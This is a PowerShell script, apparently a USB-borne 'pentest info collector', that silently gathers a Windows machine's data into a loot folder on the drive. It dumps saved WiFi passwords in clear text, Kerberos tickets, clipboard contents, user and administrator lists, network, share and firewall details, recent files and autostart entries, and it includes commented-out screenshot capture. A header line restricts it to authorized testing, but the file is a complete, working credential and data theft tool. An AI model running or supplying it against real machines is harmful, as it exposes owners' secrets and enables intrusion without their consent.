# ============================================
# USB-PI - USB Pentest Info Collector
# For AUTHORIZED penetration testing only
# ============================================
$ErrorActionPreference = "SilentlyContinue"

# Find USB drive (the drive containing this script)
$usb = Split-Path -Parent $MyInvocation.MyCommand.Path
$stamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$loot = Join-Path $usb "LOOT\$env:COMPUTERNAME"
New-Item -ItemType Directory -Path $loot -Force | Out-Null

# --- System info ---
systeminfo | Out-File "$loot\systeminfo.txt"

# --- Network ---
ipconfig /all          | Out-File "$loot\ipconfig.txt"
arp -a                 | Out-File "$loot\arp.txt"
netstat -ano           | Out-File "$loot\netstat.txt"
route print            | Out-File "$loot\routes.txt"
nslookup $env:COMPUTERNAME | Out-File "$loot\dns.txt"

# --- Shares / users / domain ---
net user               | Out-File "$loot\users.txt"
net localgroup administrators | Out-File "$loot\admins.txt"
net share              | Out-File "$loot\shares.txt"
whoami /all            | Out-File "$loot\whoami.txt"

# --- WiFi passwords (plain text) ---
netsh wlan show profiles | Out-File "$loot\wifi_profiles.txt"
$profs = (netsh wlan show profiles) | Select-String ":(.+)" | ForEach-Object {$_.Matches[0].Groups[1].Value.Trim()}
$wifi = foreach ($p in $profs) { netsh wlan show profile name="$p" key=clear }
$wifi | Out-File "$loot\wifi_keys.txt"

# --- Installed software ---
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher |
  Sort-Object DisplayName |
  Format-Table -AutoSize | Out-File "$loot\installed_software.txt"

# --- Running processes & services ---
Get-Process | Format-Table -AutoSize | Out-File "$loot\processes.txt"
Get-Service | Where-Object {$_.Status -eq "Running"} | Format-Table -AutoSize | Out-File "$loot\services.txt"

# --- Scheduled tasks (persistence recon) ---
schtasks /query /fo LIST /v | Out-File "$loot\scheduled_tasks.txt"

# --- Registry recon (autostart, RDP, firewall, UAC) ---
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Out-File "$loot\autostart.txt"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections | Out-File "$loot\rdp.txt"
netsh advfirewall show allprofiles | Out-File "$loot\firewall.txt"

# --- Local security posture ---
Get-LocalUser | Format-Table -AutoSize | Out-File "$loot\local_users.txt"
klist         | Out-File "$loot\kerberos_tickets.txt"

# --- USB history & recent files ---
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTN*\* |
  Select-Object FriendlyName | Out-File "$loot\usb_history.txt"
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Recurse |
  Select-Object Name, LastWriteTime | Out-File "$loot\recent_files.txt"

# --- Clipboard ---
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText() | Out-File "$loot\clipboard.txt"

# --- Screenshot (optional, uncomment to enable) ---
# Add-Type -AssemblyName System.Drawing
# $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
#                                      [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
# $g = [System.Drawing.Graphics]::FromImage($b)
# $g.CopyFromScreen(0,0,0,0,$b.Size)
# $b.Save("$loot\screenshot.png")

# Done marker
"DONE $stamp" | Out-File "$loot\_COMPLETE.txt"
